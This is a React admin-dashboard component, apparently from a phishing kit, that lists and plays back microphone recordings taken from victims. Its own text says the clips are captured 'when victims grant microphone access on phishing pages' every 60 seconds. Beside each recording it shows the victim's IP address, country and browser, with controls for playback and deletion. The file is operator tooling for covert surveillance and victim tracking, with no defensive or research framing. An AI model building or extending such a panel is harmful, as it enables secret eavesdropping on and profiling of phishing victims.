import React, { useState, useEffect } from 'react';
import { Box, Typography, Grid, Card, CardContent, Chip, Button, IconButton, Dialog, DialogContent, DialogTitle, DialogActions, LinearProgress, Slider } from '@mui/material';
import RefreshIcon from '@mui/icons-material/Refresh';
import DeleteIcon from '@mui/icons-material/Delete';
import PlayArrowIcon from '@mui/icons-material/PlayArrow';
import PauseIcon from '@mui/icons-material/Pause';
import VolumeUpIcon from '@mui/icons-material/VolumeUp';
import GraphicEqIcon from '@mui/icons-material/GraphicEq';
import axios from 'axios';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

const authHeaders = () => {
  const token = localStorage.getItem('admin_token');
  return token ? { Authorization: `Bearer ${token}` } : {};
};

export default function AudioGallery() {
  const [captures, setCaptures] = useState([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(0);
  const [loading, setLoading] = useState(false);
  const [playing, setPlaying] = useState(null);
  const [audioRef, setAudioRef] = useState(null);
  const [progress, setProgress] = useState(0);

  const fetchCaptures = async () => {
    setLoading(true);
    try {
      const res = await axios.get(`${API_URL}/api/admin/audio-captures`, { 
        params: { page: page + 1, limit: 20 },
        headers: authHeaders()
      });
      setCaptures(res.data.captures);
      setTotal(res.data.pagination.total);
    } catch(e) { console.error(e); }
    finally { setLoading(false); }
  };

  useEffect(() => { fetchCaptures(); }, [page]);

  useEffect(() => {
    return () => {
      if (audioRef) {
        audioRef.pause();
        audioRef.src = '';
      }
    };
  }, [audioRef]);

  const togglePlay = (capture) => {
    if (playing === capture._id) {
      if (audioRef) {
        audioRef.pause();
        audioRef.src = '';
      }
      setPlaying(null);
      setProgress(0);
      return;
    }

    if (audioRef) {
      audioRef.pause();
      audioRef.src = '';
    }

    if (!capture.cloudinaryUrl) return;

    const audio = new Audio(capture.cloudinaryUrl);
    audio.addEventListener('timeupdate', () => {
      if (audio.duration) {
        setProgress((audio.currentTime / audio.duration) * 100);
      }
    });
    audio.addEventListener('ended', () => {
      setPlaying(null);
      setProgress(0);
    });
    audio.play().catch(e => console.error('Audio play error:', e));
    setAudioRef(audio);
    setPlaying(capture._id);
    setProgress(0);
  };

  const handleDelete = async (id) => {
    try {
      await axios.delete(`${API_URL}/api/admin/audio-captures/${id}`, { headers: authHeaders() });
      if (playing === id) {
        if (audioRef) { audioRef.pause(); audioRef.src = ''; }
        setPlaying(null);
      }
      fetchCaptures();
    } catch(e) { console.error(e); }
  };

  const pages = Math.ceil(total / 20);

  const formatDuration = (seconds) => {
    if (!seconds) return '~10s';
    const s = Math.round(seconds);
    return `${s}s`;
  };

  return (
    <Box>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3, flexWrap: 'wrap', gap: 1 }}>
        <Box>
          <Typography variant="h4" sx={{ color: '#fff', fontWeight: 700 }}>
            🎤 Audio Captures
          </Typography>
          <Typography sx={{ color: '#888', fontSize: '0.85rem', mt: 0.5 }}>
            {total} total recordings • Page {page + 1} of {pages || 1}
          </Typography>
        </Box>
        <Button
          variant="outlined" size="small"
          startIcon={<RefreshIcon />}
          onClick={fetchCaptures}
          disabled={loading}
          sx={{ borderColor: '#555', color: '#aaa' }}
        >
          Refresh
        </Button>
      </Box>

      {/* Stats bar */}
      <Box sx={{ display: 'flex', gap: 2, mb: 3, flexWrap: 'wrap' }}>
        <Chip label={`🎤 ${total} Recordings`} sx={{ bgcolor: 'rgba(255,170,0,0.1)', color: '#ffaa00' }} />
        <Chip label={`📄 Page ${page + 1}/${pages || 1}`} sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#888' }} />
        {captures.length > 0 && captures.some(c => c.cloudinaryUrl) && (
          <Chip label="🔊 Cloudinary hosted" sx={{ bgcolor: 'rgba(0,240,255,0.1)', color: '#00f0ff' }} />
        )}
      </Box>

      {captures.length === 0 ? (
        <Box sx={{ textAlign: 'center', py: 8 }}>
          <Typography sx={{ fontSize: '4rem', mb: 2, opacity: 0.3 }}>🎤</Typography>
          <Typography sx={{ color: '#888', mb: 1 }}>No audio captures yet</Typography>
          <Typography sx={{ color: '#666', fontSize: '0.85rem' }}>
            Audio recordings will appear here when victims grant microphone access on phishing pages.
            Clips are recorded in 10-second chunks every 60 seconds.
          </Typography>
        </Box>
      ) : (
        <Grid container spacing={2}>
          {captures.map(cap => (
            <Grid item xs={12} sm={6} md={4} key={cap._id}>
              <Card sx={{
                bgcolor: '#111827',
                border: playing === cap._id ? '2px solid #ffaa00' : '1px solid rgba(255,255,255,0.05)',
                transition: 'all 0.2s',
                '&:hover': { transform: 'translateY(-2px)', boxShadow: '0 8px 25px rgba(0,0,0,0.3)' }
              }}>
                <CardContent sx={{ p: 2, '&:last-child': { pb: 2 } }}>
                  {/* Header */}
                  <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', mb: 1.5 }}>
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                      <GraphicEqIcon sx={{ color: playing === cap._id ? '#ffaa00' : '#888', fontSize: 24 }} />
                      <Box>
                        <Typography sx={{ color: '#fff', fontSize: '0.85rem', fontWeight: 600 }}>
                          Audio Recording
                        </Typography>
                        <Typography sx={{ color: '#888', fontSize: '0.7rem' }}>
                          {new Date(cap.capturedAt).toLocaleString()}
                        </Typography>
                      </Box>
                    </Box>
                    <Chip
                      label={formatDuration(cap.duration)}
                      size="small"
                      sx={{ bgcolor: 'rgba(255,170,0,0.1)', color: '#ffaa00', fontSize: '0.65rem', height: 20 }}
                    />
                  </Box>

                  {/* Amplitude visual indicator */}
                  <Box sx={{ display: 'flex', gap: 0.5, mb: 1.5, height: 24, alignItems: 'flex-end' }}>
                    {Array.from({ length: 20 }).map((_, i) => {
                      const h = cap.amplitude ? Math.max(4, (cap.amplitude / 255) * 20 * (0.5 + Math.random() * 0.5)) : 8;
                      return (
                        <Box key={i} sx={{
                          flex: 1, height: playing === cap._id ? `${h}px` : `${Math.max(4, h * 0.6)}px`,
                          bgcolor: playing === cap._id ? '#ffaa00' : 'rgba(255,170,0,0.3)',
                          borderRadius: '2px 2px 0 0',
                          transition: 'height 0.3s, background-color 0.3s'
                        }} />
                      );
                    })}
                  </Box>

                  {/* Progress bar */}
                  {playing === cap._id && (
                    <LinearProgress
                      variant="determinate"
                      value={progress}
                      sx={{ mb: 1, height: 3, borderRadius: 2, bgcolor: 'rgba(255,170,0,0.1)', '& .MuiLinearProgress-bar': { bgcolor: '#ffaa00' } }}
                    />
                  )}

                  {/* Metadata */}
                  <Box sx={{ display: 'flex', gap: 0.5, flexWrap: 'wrap', mb: 1 }}>
                    <Chip label={`📊 ${cap.amplitude ? Math.round(cap.amplitude) : '?'} avg`} size="small" sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#888', fontSize: '0.6rem', height: 18 }} />
                    <Chip label={`🔊 ${cap.sampleRate || '?'} Hz`} size="small" sx={{ bgcolor: 'rgba(255,255,255,0.05)', color: '#888', fontSize: '0.6rem', height: 18 }} />
                    {cap.cloudinaryUrl && <Chip label="☁️ CDN" size="small" sx={{ bgcolor: 'rgba(0,240,255,0.1)', color: '#00f0ff', fontSize: '0.6rem', height: 18 }} />}
                  </Box>

                  {cap.sessionId?.ipAddress && (
                    <Typography sx={{ color: '#666', fontSize: '0.7rem', fontFamily: 'monospace' }}>
                      {cap.sessionId.ipAddress} • {cap.sessionId?.geolocation?.country || ''} • {cap.sessionId?.browser || ''}
                    </Typography>
                  )}

                  {/* Play/Delete controls */}
                  <Box sx={{ display: 'flex', gap: 1, mt: 1.5 }}>
                    <Button
                      fullWidth size="small" variant="contained"
                      startIcon={playing === cap._id ? <PauseIcon /> : <PlayArrowIcon />}
                      onClick={() => togglePlay(cap)}
                      disabled={!cap.cloudinaryUrl}
                      sx={{
                        bgcolor: playing === cap._id ? '#ffaa00' : '#333',
                        color: playing === cap._id ? '#000' : '#fff',
                        '&:hover': { bgcolor: playing === cap._id ? '#ee9900' : '#555' },
                        '&:disabled': { bgcolor: 'rgba(255,255,255,0.05)', color: '#555' }
                      }}
                    >
                      {playing === cap._id ? 'Pause' : cap.cloudinaryUrl ? '▶ Play' : 'No Audio'}
                    </Button>
                    <IconButton
                      size="small"
                      onClick={() => handleDelete(cap._id)}
                      sx={{ color: '#888', '&:hover': { color: '#ff0055' }, border: '1px solid rgba(255,255,255,0.05)' }}
                    >
                      <DeleteIcon sx={{ fontSize: 18 }} />
                    </IconButton>
                  </Box>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      )}

      {/* Pagination */}
      {pages > 1 && (
        <Box sx={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 2, mt: 3 }}>
          <Button variant="outlined" size="small" disabled={page === 0} onClick={() => setPage(p => Math.max(0, p - 1))} sx={{ borderColor: '#555', color: '#aaa' }}>← Previous</Button>
          <Typography sx={{ color: '#888', fontSize: '0.85rem' }}>Page {page + 1} of {pages}</Typography>
          <Button variant="outlined" size="small" disabled={page >= pages - 1} onClick={() => setPage(p => p + 1)} sx={{ borderColor: '#555', color: '#aaa' }}>Next →</Button>
        </Box>
      )}
    </Box>
  );
}